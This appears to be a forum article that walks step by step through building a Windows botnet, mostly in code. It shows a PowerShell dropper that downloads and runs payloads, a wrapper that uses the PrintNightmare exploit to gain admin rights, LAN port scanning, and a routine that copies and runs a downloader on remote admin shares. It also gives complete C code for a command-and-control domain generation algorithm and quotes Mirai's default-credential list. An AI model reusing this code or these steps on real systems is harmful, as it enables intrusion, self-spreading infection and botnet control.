<p>In this article, I will discuss the fundamentals of botnets dev, providing insights into their structure and operation. After stumbling upon a post titled “How does one create an IOT botnet?”, I thought about writing an article covering the fundamentals of botnet project I wrote a long time ago and how vulnerabilities are exploited by worms to propagate through networks. So, let’s start with a simple definition:</p>
<p><strong>What is a Botnet?</strong> In simple terms, a botnet is a network of computers infected by malware and controlled by a single entity or party.</p>
<p>Botnets usually operate through three stages or more. In this article, I’ll go over each stage, explaining how they work, and provide code example. Finally, a detailed explanation, Let’s get started with our exploration of botnets and their inner workings.</p>
<h1><a name="entry-point-1" class="anchor" href="https://0x00sec.org#entry-point-1"></a>Entry Point</h1>
<p>The primary approach involves utilizing spam campaigns, This method is preferred due to its simplicity making it challenging to trace the origin of the initial infection or its source. The attack is mass rather then targeted, So, Typically you get an e-mails contain a malicious attachment that is often referred to as an invoice, and that’s usually the stage 1 of every infection “The malicious macro” a social engineering attempt to lure an unsuspecting victim into executing the payload of the document, In this article we gone wear the black hat and play the role.</p>
<pre data-code-wrap="asm"><code class="lang-plaintext">        Initial Access         Execution              Persistence
             |                      |                      |
             V                      V                      V
[PrintNightmare Exploit] ---&gt; [Malware Injection] ---&gt; [Maintain Control]   

    Command and Control     Actions on Objectives
             |                      |
             V                      V
    [Phone Home to C&amp;C] ---&gt; [Initiate The Attack]   
					                                   Figure 1
</code></pre>
<p>In Figure 1, The malware operates multi-stage components that inject later stages into separate processes, First exploit a vulnerability for the sake of this article I’m gone deploy an old vulnerability Known as “Print Spooler Vulnerability” or “PrintNightmare”  to infect vulnerable devices and spread the malware within the network, Next deployed our botnet and finally phone C&amp;C to activated and attack is initiated. The main goal is to establishes a connection to a target server, receives instructions, and then launches the DDoS attack using multiple threads.</p>
<p>The multi-stage approach has advantages despite the fact that creating complex, only one-phase could seem to be the best way of achieving our objective. By structuring the stages, I can reduce the impact if one fails or is detected too early. Because of its modular design, the operation stays simple and hidden even if one component is compromised, Given each stage will automatically activate self deletion if succeeds. Moreover, a multi-stage design allows us to modify and enhance the attack plan, creating a balance between complexity and simplicity enables us to obfuscate the command and control channel to make detection more difficult.</p>
<h2><a name="stage-1-the-dropped-powershell-script-2" class="anchor" href="https://0x00sec.org#stage-1-the-dropped-powershell-script-2"></a>Stage 1 - The dropped Powershell script</h2>
<p>During this phase, we assume that the target has fallen for our social engineering tactic and activated the embedded macro within the document. Upon opening the file, the contained code is executed, leading to the deployment of a PowerShell script.</p>
<pre><code class="lang-auto">$urlArray = \"".split(\",\");
$randomNumber = $randomGenerator.next(1, 65536);
$downloadedFile = \"c:\windows\temp\";
foreach($url in $urlArray){
	try{
		$webClient.downloadfile($url.ToString(), $downloadedFile);
		start-process $downloadedFile;
		break;
	}catch{}
}
</code></pre>
<p>The script systematically cycles through a predefined list of domain names, attempting to retrieve the subsequent stage. Specifically, it targets the directory <em>C:\windows\temp/</em>. If the download is successful, the acquired file is executed. Should an error arise, the process continues with the next URL, as the <code>catch</code> clause is left empty. In a real-world scenario, Obfuscation would be taken to an advanced level.</p>
<h2><a name="stage-2-payload-delivery-and-privilege-escalation-3" class="anchor" href="https://0x00sec.org#stage-2-payload-delivery-and-privilege-escalation-3"></a>Stage 2 - Payload Delivery and Privilege Escalation</h2>
<p>When this phase is triggered, the next stage involves checking a set of conditions before proceeding to download the malware, These conditions help ensure controlled execution “I do not want shoot myself”</p>
<p>Next, essential host information is gathered from the system, and a check for administrative privileges is conducted. If the current user lacks such privileges, the script will relaunch with elevated permissions. The ultimate objective is to determine if the current user has administrative access; if not, an attempt to escalate privileges ensues by leveraging the <code>PrintNightmare</code> vulnerability.</p>
<p>in this example.we’re utilizing <code>CVE-2021-34527</code>, known as <code>PrintNightmare</code>, for a Local Privilege Escalation (LPE) scenario using a purely PowerShell-based approach. The provided PowerShell script executes the PrintNightmare attack technique, aiming to elevate local privileges on the system.</p>
<p>This function is designed to automate the exploitation of the <code>CVE-2021-34527</code>, commercing by loading and executing a PowerShell script containing the exploit code you can find on <a href="https://github.com/JohnHammond/CVE-2021-34527/blob/master/CVE-2021-34527.ps1" rel="noopener nofollow ugc">github</a>, and it checks for successful privilege escalation</p>
<p>In simple term’s the (poc)exploit objective is to escalate privileges by leveraging the PrintNightmare vulnerability. It first generates a payload DLL, constructs custom structures, and then attempts to load the payload as a printer driver.</p>
<p>Let’s break down some key functionalities (PoC):</p>
<p>The heart of the exploit is encapsulated within the <code>Invoke-Nightmare</code> function. This function is responsible for creating and executing the exploit payload.</p>
<p><strong>2. Parameters:</strong></p>
<p>The <code>Invoke-Nightmare</code> function accepts the following parameters:</p>
<ul>
<li><code>$DriverName</code>: A string parameter, which may be set to a benign name.</li>
<li><code>$NewUser</code>: A string parameter, representing the new username for privilege escalation.</li>
<li><code>$NewPassword</code>: A string parameter, representing the new password for privilege escalation.</li>
<li><code>$DLL</code>: A string parameter, which can be used to provide a custom payload DLL (Dynamic Link Library) or left empty to generate a payload.</li>
</ul>
<p><strong>3. DLL Generation and Customization:</strong></p>
<ul>
<li>If <code>$DLL</code> is not provided (empty), the PoC generates a malicious DLL payload by:
<ul>
<li>Obtaining the payload data as a base64-encoded string using the <code>get_nightmare_dll</code> function.</li>
<li>Converting the base64 string to byte data.</li>
<li>Encoding the new username and password into the payload, if provided.</li>
<li>Saving the payload as a temporary DLL file (<code>nightmare.dll</code>) in the system’s temporary directory.</li>
</ul>
</li>
</ul>
<p>We store the payload as a string. It decodes a base64-encoded string into a PowerShell script, presumably containing the code to exploit CVE-2021-34527 (PrintNightmare).</p>
<p><strong>Checking for Admin Privileges:</strong><br>
The function begins by checking if the current user has administrator privileges using a custom function or cmdlet called <code>Test-Admin</code>. If the user already has admin privileges, the exploit is not executed, as there is no need for further escalation.</p>
<pre><code class="lang-auto">function PrivEsc {
    if (-not (Test-Admin)) {
        $NightmareCVE = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($PrintNightmare))
        $d_path = "c:/users/$env:USERNAME/appdata/local/temp/$(Get-RandomString (Get-Random -Minimum 5 -Maximum 12))"
        Set-Content -Path "$d_path.ps1" -Value $NightmareCVE
        $try_nightmare = Invoke-Expression -Command "Import-Module $d_path.ps1; Invoke-Nightmare -NewUser '$env:USERNAME' -NewPassword '0xph001234!!'"
        if (Test-Admin) {
            Write-Host "got admin!"
            return $true
        }
        $check_imp = Invoke-Expression -Command 'whoami /priv' | ForEach-Object { $_.ToLower() }
        foreach ($line in $check_imp) {
            if ($line -match 'seimpersonateprivilege' -and $line -match 'enabled') {
            }
        }
    }
    return $false
}
</code></pre>
<p><strong>Executing the Exploit:</strong><br>
Next, Creates a new PowerShell script file in the random directory path (<code>"$d_path.ps1"</code>) and writes the decoded exploit code (<code>$NightmareCVE</code>) into the file,  attempts to execute the PowerShell script using <code>Invoke-Expression</code>. It imports the module (<code>Import-Module $d_path.ps1</code>) and passes parameters to the <code>Invoke-Nightmare</code> function, including a new username and password. (<code>$env:USERNAME</code>) and a new password (<code>'0xph001234!!'</code>).</p>
<p>After executing the exploit, the script checks again for admin privileges using <code>Test-Admin</code>. If the user now has admin privileges, it writes “got admin!” to the console and returns <code>true</code>, indicating a successful privilege escalation, and finally we execute <code>whoami /priv</code> to check for a successful <strong>Exploitation</strong>  or if the malware is unable to, or if they already have admin privileges before running the code.</p>
<h2><a name="stage-3-network-enumeration-and-propagation-4" class="anchor" href="https://0x00sec.org#stage-3-network-enumeration-and-propagation-4"></a>Stage 3 - Network Enumeration and Propagation</h2>
<p>In this phase, we conduct network enumeration, identify vulnerable ports, and exploit open ports for potential propagation. This phase involves:</p>
<p>pivotal in identifying local network addresses, particularly those associated with common private IP ranges. By excluding the ‘lo’ interface, which pertains to the local loopback, this function establishes a basis for subsequent actions involving local network enumeration.</p>
<p>Fundamentally, This process of pinpointing these local addresses is what furnishes us with the indispensable intelligence we require.</p>
<pre><code class="lang-auto">function Get-LAN {
    $interfaces = [Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces()
    $localIP = @()

    foreach ($interface in $interfaces) {
        if ($interface.Name -eq 'lo') {
            continue
        }
        
        $iface = $interface.GetIPProperties().UnicastAddresses | Where-Object { $_.Address.AddressFamily -eq 'InterNetwork' }
        if ($iface -ne $null) {
            foreach ($j in $iface) {
                $addr = $j.Address.IPAddressToString
                if ($addr -match '^192\.168|^172\.16') {
                    $localIP += $addr
                }
            }
        }
    }
    return $localIP
}

</code></pre>
<ol>
<li>
<p>Utilizing the <code>System.Net.NetworkInformation.NetworkInterface</code> class, it retrieves a list of network interfaces present on the local system.</p>
</li>
<li>
<p>It filters out the ‘lo’ interface (loopback), which is typically used for local testing and doesn’t provide relevant network information.</p>
</li>
<li>
<p>For each network interface, it extracts the IPv4 addresses that belong to common private IP ranges (e.g., 192.168.x.x, 172.16.x.x).</p>
</li>
<li>
<p>These identified local IP addresses are collected and stored in the <code>$localIP</code> array, which forms the foundation for subsequent actions related to local network enumeration.</p>
</li>
</ol>
<p>Next,  our objective to pinpoint vulnerable ports within the local network. first leverages the IP addresses obtained from the <code>Get-LAN</code> function and iterates through a list of ports that are commonly exploited by attackers.</p>
<pre><code class="lang-auto">function Get-VulnPorts {
    $vulnPorts = @('445', '3389', '5985')
    $vuln = @{}
    $localIP = Get-LAN

    foreach ($addr in $localIP) {
        $ipParts = $addr -split '\.'
        $range = [ipaddress]::Parse("$($ipParts[0]).$($ipParts[1]).1.0/24")

        foreach ($ip in $range.AddressList) {
            foreach ($port in $vulnPorts) {
                $client = New-Object System.Net.Sockets.TcpClient
                $result = $client.BeginConnect($ip, $port, $null, $null)
                $wait = $result.AsyncWaitHandle.WaitOne(100, $false)
                if ($wait -and !$client.Connected) {
                    if ($vuln.ContainsKey($ip.ToString())) {
                        $vuln[$ip.ToString()] += ",$port"
                    } else {
                        $vuln[$ip.ToString()] = $port
                    }
                }
                $client.Close()
            }
        }
    }
    return $vuln
}
</code></pre>
<p>For each IP address and port combination, the function tests the ability to establish a connection. Failed connections prompt recording of the IP and port in the <code>$vuln</code> hash table, indicating potential security weaknesses.</p>
<ol>
<li>
<p>It maintains a predefined list of commonly exploited vulnerable ports, including 445 (SMB), 3389 (RDP), and 5985 (WinRM).</p>
</li>
<li>
<p>For each local IP address, the function iterates through the list of vulnerable ports and attempts to establish a connection using <code>System.Net.Sockets.TcpClient</code>.</p>
</li>
<li>
<p>If a connection attempt fails (indicating an open port), the function records both the IP address and the port number in the <code>$vuln</code> hash table. This hash table provides a comprehensive list of potential security weaknesses within the local network.</p>
</li>
</ol>
<p>This one is self explanatory we builds on insights from the <code>Get-VulnPorts</code> function.and focuses on exploiting open ports. Specifically, if a vulnerable port corresponds to SMB (port 445).</p>
<pre><code class="lang-auto">function Abuse-OpenPorts {
    $smb = '445'
    $mstsc = '3389'
    $ports = Get-VulnPorts

    foreach ($ip in $ports.Keys) {
        $openPorts = $ports[$ip] -split ','

        foreach ($port in $openPorts) {
            if ($port -eq $smb) {
                Drop-OnShare $ip
            } elseif ($port -eq $mstsc) {
                MSTSC-Nightmare $ip
            }
        }
    }
}
</code></pre>
<ol>
<li>
<p>Checking whether the vulnerable ports identified in the previous step correspond to specific services, such as SMB (port 445) or RDP (port 3389).</p>
</li>
<li>
<p>Depending on the service associated with an open port, the function invokes corresponding functions, such as <code>Drop-OnShare</code> or <code>MSTSC-Nightmare</code>, to escalate the potential vulnerability.</p>
</li>
<li>
<p>For open ports that match SMB (port 445), the <code>Drop-OnShare</code> function is called to exploit shared network resources on remote systems.</p>
</li>
<li>
<p>For open ports corresponding to RDP (port 3389), the function invokes the <code>MSTSC-Nightmare</code> function to further exploit the potential vulnerability.</p>
</li>
</ol>
<p>If pass the function invokes <code>Drop-OnShare</code> to execute actions targeting shared resources. Similarly, if the vulnerable port matches RDP (port 3389), <code>MSTSC-Nightmare</code> is invoked to further exploit the situation.</p>
<p>and finally leveraging information gathered to exploit shared network resources on remote systems. Its core functionalities include payload delivery and lateral movement:</p>
<pre><code class="lang-auto">function Drop-OnShare($ip) {
    $payload = @"
    (New-Object Net.WebClient).DownloadFile('', 'C:\phoo.exe')
    Start-Process 'C:\'
"@
    
    $defaultShares = @('C$', 'D$', 'ADMIN$')
    $availableDrive = Get-PSDrive -Name 'Z' -ErrorAction SilentlyContinue

    if ($availableDrive -eq $null) {
        $availableDrive = Get-PSDrive -Name ('A'..'Z' | Where-Object { Test-Path $_: -PathType Container } | Select-Object -First 1)
    }

    foreach ($share in $defaultShares) {
        try {
            $sharePath = "\\$ip\$share"
            if (Test-Path -Path $sharePath) {
                $null = Invoke-Expression -Command "net use $($availableDrive.Name): $sharePath /user:username password 2&gt;&amp;1"
                if (Test-Path -Path "$($availableDrive.Name):") {
                    $payloadPath = "$($availableDrive.Name):\aaaa.ps1"
                    $payload | Set-Content -Path $payloadPath
                    $null = Invoke-Expression -Command "powershell -ExecutionPolicy Bypass -File $payloadPath"
                    Remove-Item -Path $payloadPath
                    $null = Invoke-Expression -Command "net use $($availableDrive.Name): /delete /yes"
                }
            }
        }
        catch {}
    }
}
</code></pre>
<p>The primary purpose of the <code>Drop-OnShare($ip)</code> function is to utilize the inherent vulnerabilities of shared network resources to distribute and execute malicious payloads on remote systems. By taking advantage of administrative shares, the function aims to achieve the following goals:</p>
<ol>
<li>
<p><strong>Payload Delivery:</strong> The function utilizes an embedded PowerShell payload within the script to download a malware file (<code>phoo.exe</code>) and initiate its execution on the target system.</p>
</li>
<li>
<p><strong>Lateral Movement:</strong> By taking advantage of administrative shares (<code>C$</code>, <code>D$</code>, <code>ADMIN$</code>), the function facilitates lateral movement within the network. It maps these shares to drive letters.</p>
</li>
</ol>
<p>For each default administrative share (<code>C$</code>, <code>D$</code>, <code>ADMIN$</code>), it attempts to map the share to the available drive using the <code>net use</code> command with supplied credentials (username and password), If the share mapping is successful, the payload is written to a file on the remote system, executed, and then removed.</p>
<h2><a name="stage-4-the-binary-5" class="anchor" href="https://0x00sec.org#stage-4-the-binary-5"></a>Stage 4 – The binary</h2>
<p>Once the conditions are met and the execution proceeds as planned, the user’s device becomes part of our botnet. The next step involves our bot binary identifying and connecting to a Command and Control (C&amp;C) server for exchanging messages. This connection may be established using either a hardcoded IP address or domain name.</p>
<p>Next, We develop an algorithm that generates predictable domain names associated with the C&amp;C server. This algorithm’s specifics are known only to the C&amp;C server operators, making it difficult to extract or block communication based on domain names.</p>
<h3><a name="domain-generation-algorithms-dgas-6" class="anchor" href="https://0x00sec.org#domain-generation-algorithms-dgas-6"></a>Domain Generation Algorithms (DGAs):</h3>
<p>For this part the DGA used generated domain names based on various parameters, including the current date and time.</p>
<h4><a name="features-7" class="anchor" href="https://0x00sec.org#features-7"></a>Features</h4>
<ol>
<li>
<p>Daily Domain Generation: The DGA can generate up to 50 different domain names per day. This high degree of variability ensures that the C&amp;C server can rapidly adapt to changing circumstances, making it challenging for security analysts to predict and block communication.</p>
</li>
<li>
<p>Multiple Domain Testing: To further confound detection efforts, the malware will test up to 20 different domains in succession. Each domain is tested only once, reducing the risk of patterns emerging in communication behavior.</p>
</li>
<li>
<p>Delay Mechanism: There is a built-in 5s wait time between attempts to connect to new domains. This delay helps the botnet avoid triggering suspicion by flooding network traffic with connection attempts.</p>
</li>
</ol>
<p>The domain generation routine first generates a seed which depends on the sequence number and system time. The seed is built using cryptographic hashes. The hashing algorithm is SHA256, The seed is generated as follows:</p>
<pre><code class="lang-auto">    // Update SHA-256 hash with sequence number
    SHA256_CTX sha256_context;
    SHA256_Init(&amp;sha256_context);
    SHA256_Update(&amp;sha256_context, &amp;seq_nr, sizeof(seq_nr));

    // Update SHA-256 hash with year, month, and day
    SHA256_Update(&amp;sha256_context, &amp;date-&gt;tm_year, sizeof(date-&gt;tm_year));
    SHA256_Update(&amp;sha256_context, &amp;date-&gt;tm_mon, sizeof(date-&gt;tm_mon));
    SHA256_Update(&amp;sha256_context, &amp;date-&gt;tm_mday, sizeof(date-&gt;tm_mday));

    // Finalize the SHA-256 hash
    unsigned char sha256_result[SHA256_DIGEST_LENGTH];
    SHA256_Final(sha256_result, &amp;sha256_context);

    // Convert SHA-256 hash to hex string
    for (int i = 0; i &lt; SHA256_DIGEST_LENGTH; i++) {
        snprintf(domain_parts + i * 2, 3, "%02x", sha256_result[i]);
    }

</code></pre>
<p>The core function generates a complete domain name:</p>
<ul>
<li>It selects a random suffix from a predefined list.</li>
<li>Calculates the SHA-256 hash,  year, month, and day.</li>
<li>Converts the SHA-256 hash to a hexadecimal string.</li>
<li>Generates additional domain parts based on the hex values from the hash.</li>
<li>Appends the selected suffix to complete the domain name.</li>
</ul>
<p>Entry point:</p>
<ul>
<li>Seeds the random number generator with the current time.</li>
<li>Enters a loop to generate 50 domain names, each unique due to the random sequence number and date.</li>
<li>For each iteration, it generates a random sequence number, retrieves the current date, calls create_domain to generate a domain name, and tested it. It then waits for 5 seconds before the next iteration.</li>
</ul>
<h4><a name="top-level-domain-8" class="anchor" href="https://0x00sec.org#top-level-domain-8"></a>Top Level Domain :</h4>
<p>The code defines an array called suffixes that contains a list of possible top-level domain (TLD) suffixes. These suffixes represent the highest level of the domain hierarchy (e.g., “.xyz,” “.cool,” “.ninja”).</p>
<pre><code class="lang-auto">
const char *suffixes[] = {".xyz", ".cool", ".ninja"};
</code></pre>
<p>To create domain names with different TLDs, the code randomly selects one of the suffixes from the suffixes array. This random selection introduces variability into the generated domain names.</p>
<pre><code class="lang-auto">int suffix_index = rand() % (sizeof(suffixes) / sizeof(suffixes[0]));
</code></pre>
<p>After generating the domain name parts (based on the sequence number, date-based elements, the selected suffix is appended to the domain name.</p>
<pre><code class="lang-auto">strcat(domain_parts, suffixes[suffix_index]);
</code></pre>
<p>Suppose suffixes contains three TLD suffixes: “.xyz,” “.cool,” and “.ninja.”</p>
<p>During the execution of the create_domain function, a random number between 0 and 2 is generated to select one of these suffixes.</p>
<p>For instance, if suffix_index is 1 (indicating “.cool”), the generated domain name will include “.cool” as the top-level domain. The rest of the domain name is constructed based on the sequence number, date, and additional parts.</p>
<h4><a name="c-code-of-the-dga-9" class="anchor" href="https://0x00sec.org#c-code-of-the-dga-9"></a>C Code of the DGA</h4>
<pre><code class="lang-auto">
// Function to generate a cryptographically secure random number
uint32_t generate_random_sequence() {
    uint32_t seq_nr;
    if (RAND_bytes((unsigned char *)&amp;seq_nr, sizeof(seq_nr)) != 1) {
        // Handle random number generation failure
        fprintf(stderr, "Error generating random sequence number.\n");
        exit(1);
    }
    return seq_nr;
}

// Function to convert a hex string to an integer
uint32_t hex_to_int(const char *hex) {
    uint32_t result = 0;
    for (int i = 0; hex[i] != '\0'; i++) {
        result &lt;&lt;= 4;
        if (hex[i] &gt;= '0' &amp;&amp; hex[i] &lt;= '9') {
            result += hex[i] - '0';
        } else if (hex[i] &gt;= 'a' &amp;&amp; hex[i] &lt;= 'f') {
            result += hex[i] - 'a' + 10;
        }
    }
    return result;
}

// Function to generate a domain part
void generate_domain_part(uint32_t seed, int nr, char *part) {
    int i = 0;
    while (nr &gt; 1) {
        uint32_t edx = seed % 36;
        seed /= 36;
        char char_value;
        if (edx &gt; 9) {
            char_value = 'a' + (char)(edx - 10);
        } else {
            char_value = '0' + (char)edx;
        }
        part[i++] = char_value;
        if (seed == 0) {
            break;
        }
        nr--;
    }
    part[i] = '\0';
    // Reverse the part in place
    int len = strlen(part);
    for (int j = 0; j &lt; len / 2; j++) {
        char temp = part[j];
        part[j] = part[len - j - 1];
        part[len - j - 1] = temp;
    }
}
</code></pre>
<p>In summary, the code constructs domain names by combining multiple elements, including a random TLD suffix, a SHA-256 hash of the sequence number and date, and additional domain parts generated from the hash. This approach aims to create unique and unpredictable domain names.</p>
<pre><code class="lang-auto">// Function to create a domain
void create_domain(uint32_t seq_nr, struct tm *date, char *domain) {
    // Define an array of possible suffixes
    const char *suffixes[] = {".xyz", ".cool", ".ninja"};

    // Calculate a random index to select a suffix
    int suffix_index = rand() % (sizeof(suffixes) / sizeof(suffixes[0]));

    // Calculate the total length of domain_parts
    size_t total_length = SHA256_DIGEST_LENGTH * 2 + strlen(suffixes[suffix_index]) + 1;

    // Dynamically allocate memory for domain_parts
    char *domain_parts = (char *)malloc(total_length);

    // Ensure successful allocation
    if (domain_parts == NULL) {
        fprintf(stderr, "Memory allocation failed.\n");
        exit(1);
    }

    // Initialize domain_parts as an empty string
    domain_parts[0] = '\0';

    // Update SHA-256 hash with sequence number
    SHA256_CTX sha256_context;
    SHA256_Init(&amp;sha256_context);
    SHA256_Update(&amp;sha256_context, &amp;seq_nr, sizeof(seq_nr));

    // Update SHA-256 hash with year
    SHA256_Update(&amp;sha256_context, &amp;date-&gt;tm_year, sizeof(date-&gt;tm_year));

    // Update SHA-256 hash with month
    SHA256_Update(&amp;sha256_context, &amp;date-&gt;tm_mon, sizeof(date-&gt;tm_mon));

    // Update SHA-256 hash with day
    SHA256_Update(&amp;sha256_context, &amp;date-&gt;tm_mday, sizeof(date-&gt;tm_mday));

    // Finalize the SHA-256 hash
    unsigned char sha256_result[SHA256_DIGEST_LENGTH];
    SHA256_Final(sha256_result, &amp;sha256_context);

    // Convert SHA-256 hash to hex string
    for (int i = 0; i &lt; SHA256_DIGEST_LENGTH; i++) {
        snprintf(domain_parts + i * 2, 3, "%02x", sha256_result[i]);
    }

    // Generate domain parts
    for (int i = SHA256_DIGEST_LENGTH * 2; i &lt; total_length - strlen(suffixes[suffix_index]); i += 8) {
        uint32_t seed = hex_to_int(domain_parts + i);
        char part[9];
        generate_domain_part(seed, 8, part);
        strcat(domain_parts, part);
    }

    // Append the selected suffix to the domain_parts
    strcat(domain_parts, suffixes[suffix_index]);

    // Copy the generated domain to the output parameter
    strcpy(domain, domain_parts);

    // Free the dynamically allocated memory
    free(domain_parts);
}

int main() {
    // Seed the random number generator
    srand(time(NULL));

    for (int i = 0; i &lt; 50; i++) {
        uint32_t seq_nr = generate_random_sequence();  // Generate a random sequence number
        time_t rawtime;
        struct tm *date;

        time(&amp;rawtime);
        date = localtime(&amp;rawtime);

        char domain[160]; // Increased buffer size to accommodate the longer SHA-256 hash
        create_domain(seq_nr, date, domain);

        //  !!! (replace this )
        // Code here !!! 

        printf("Testing domain: %s\n", domain);

        // Wait for 5 seconds
        sleep(5);
    }

    return 0;
}
</code></pre>
<ul>
<li>
<p>Domain Resolution:</p>
<p>When a bot needs to establish communication with the C&amp;C server, it calculates the current domain name using the DGA algorithm.<br>
The algorithm generates a domain name that the bot will attempt to resolve into an IP address.</p>
</li>
<li>
<p>C&amp;C Server Setup:</p>
<p>The botnet configure a large number of domain names corresponding to possible future C&amp;C servers, These domain names are registered in advance.</p>
</li>
<li>
<p>Dynamic Resolution Attempt:</p>
<p>When the bot attempts to connect to the C&amp;C server, it tries to resolve the generated domain name into an IP address.<br>
The domain name may not exist initially, but at some point in the future, the author will register one of the pre-generated domain names, associating it with the IP address of the actual C&amp;C server.</p>
</li>
</ul>
<h2><a name="final-stage-phone-home-10" class="anchor" href="https://0x00sec.org#final-stage-phone-home-10"></a>Final Stage  - Phone Home</h2>
<p>Generating domain names is just one aspect of communication with a C&amp;C server. To establish communication with a C&amp;C server, typically needs additional functionality, such as:</p>
<ul>
<li>
<p>Network Communication: The code needs to communicate over the network, typically using protocols like HTTP, HTTPS, or custom protocols. This would involve creating sockets, sending requests to the C&amp;C server, and receiving responses, Next, Command Parsing and Data Encryption/Decryption C&amp;C communications are encrypted to hide the actual content from network monitoring, Persistence and finally, Data Exfiltration.</p>
</li>
<li>
<p>Our botnet should:</p>
<p>Include a master node that controls all other nodes on the network, Deploy disguised malware/slave nodes on host computers transmit commands from the master node to the slave node, execute, and return an output back to us</p>
</li>
</ul>
<ol>
<li><strong>Initiation:</strong></li>
</ol>
<pre><code class="lang-auto">int channel = //initiate a channel given SERVER, PORT, and name;
</code></pre>
<p>Next, Let’s define the actual connection between master and slave! To do this, define a network socket through which data can be sent. Think of master as having many ‘electrical sockets’. Now, we need to build a ‘plug’ on slave that fits master’s ‘wall sockets’. We can do this using the socket library’s <code>socket()</code> function. How convenient! <code>socket()</code> takes in 3 arguements: communications domain, socket type, and a protocol. For communication’s domain, you probably already guessed it: <code>AF_INET.</code> For socket type, we want our socket to be one that simply streams data both directions. Hence, use the given macro <code>SOCK_STREAM</code> Let’s not worry about the socket protocol.</p>
<pre><code class="lang-auto">int init_channel (char *ip, int port, char *name) {
	char msg[CMD_LENGTH];
	struct sockaddr_in server;

	server.sin_addr.s_addr = //convert the ip to network byte order
	server.sin_family = //set the server's communications domain
  server.sin_port = //convert port to network byte order
  
  int channel = //define a SOCK_STREAM socket
  
  if(channel &lt; 0) {
    perror ("socket:");
    exit(1);
  }
  
  int connection_status = //use the defined channel to connect the slave to the master server
  
  if (connection_status &lt; 0) {
    perror ("connect:");
    exit(1);
  }

  respond (channel, msg);
  return channel;
}
</code></pre>
<p>This is a fairly fundamental network. The function returns an int representing the socket. Store this value in channel. Next, we want to jump start our socket (plugging slave into master’s wall <code>socket()</code>. Call the C function <code>connect()</code>. This takes in three arguments: the channel, the <code>sockaddr struct</code>, and the size of the struct in bytes. If connect() returns a positive integer, your connection with master was successful! In order to test our newfound connection, let’s send a greeting to master! Populate our message buffer and use <code>respond()</code> to send msg through channel back to master. Finally, we want the <code>init_channel()</code> function to return this successful connection.</p>
<ol start="2">
<li><strong>Listening for messages:</strong></li>
</ol>
<p>Once the slave is connected to the master, it needs to constantly be listening for messages and act immediately upon a command. So, let’s use an infinite while loop to receive and parse these messages, below the <code>printf</code> statement, add an infinite while loop that calls two functions: <code>recieve()</code> and <code>parse()</code> in that order. Both functions take the channel and msg stack buffer as arguments. This should look something like:</p>
<pre><code class="lang-auto">Infinite Loop {
  recieve(...);
  parse(...);
}
</code></pre>
<p>Also It’s important to note that having a large number of bots attempting to connect to a single C&amp;C server simultaneously can inadvertently launch a Distributed Denial of Service (DDoS) attack against the server. To address this, we adopt a hierarchical structure where groups of bots, typically in batches of a fixed number like 50, report to intermediary nodes. These nodes can be part of the botnet and may further relay requests and responses to other nodes before reaching the main C&amp;C server. This division of labor helps distribute the load and reduces the risk of DDoS attacks on the primary C&amp;C server.</p>
<h1><a name="final-notes-and-analysis-11" class="anchor" href="https://0x00sec.org#final-notes-and-analysis-11"></a>Final Notes and  Analysis</h1>
<p>Our botnet is still pretty uninteresting; I avoided the most interesting part for obvious reasons: this is not true malware; it only has to teach you the basics. A botnet is an interesting piece of code and requires a skilled coder, not necessarily an experienced one. Understanding networking protocols, including TCP/IP, DNS, and HTTP, Also, some exploit development is initiated through the exploitation of vulnerabilities. Setting up and maintaining C&amp;C servers to issue commands to botnet nodes is one of the most important things to consider because it has many aspects. One of them is maintaining the OpSec of the botnet infrastructure and its operators. Implementing encryption and cryptographic techniques Planning for infections, spreading, and having a killswitch if things go sideways, which they always do,</p>
<p>Let’s take, for example, the Mirai malware, for which I explained a code snippet of the leaked source code in the original post. Mirai is one of the successfully operated With over a quarter billion CCTV cameras around the world alone, as well as the continued growth of other IoT devices infected. So let’s revisit some of the functionalities. The malware performs wide-ranging scans of IP addresses to locate under-secured IoT devices that could be remotely accessed via easily guessable login credentials.</p>
<aside class="onebox githubblob" data-onebox-src="https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L123">
  <header class="source">

      <a href="https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L123" target="_blank" rel="noopener nofollow ugc">github.com</a>
  </header>

  <article class="onebox-body">
    <h4><a href="https://github.com/soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L123" target="_blank" rel="noopener nofollow ugc">soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L123</a></h4>



    <pre class="onebox"><code class="lang-c">
      <ol class="start lines" start="113" style="counter-reset: li-counter 112 ;">
          <li>iph-&gt;ttl = 64;</li>
          <li>iph-&gt;protocol = IPPROTO_TCP;</li>
          <li></li>
          <li>// Set up TCP header</li>
          <li>tcph-&gt;dest = htons(23);</li>
          <li>tcph-&gt;source = source_port;</li>
          <li>tcph-&gt;doff = 5;</li>
          <li>tcph-&gt;window = rand_next() &amp; 0xffff;</li>
          <li>tcph-&gt;syn = TRUE;</li>
          <li></li>
          <li class="selected">// Set up passwords</li>
          <li>add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511</li>
          <li>add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv</li>
          <li>add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin</li>
          <li>add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin</li>
          <li>add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      // root     888888</li>
          <li>add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                  // root     xmhdipc</li>
          <li>add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                  // root     default</li>
          <li>add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);              // root     juantech</li>
          <li>add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);                      // root     123456</li>
          <li>add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                          // root     54321</li>
      </ol>
    </code></pre>



  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

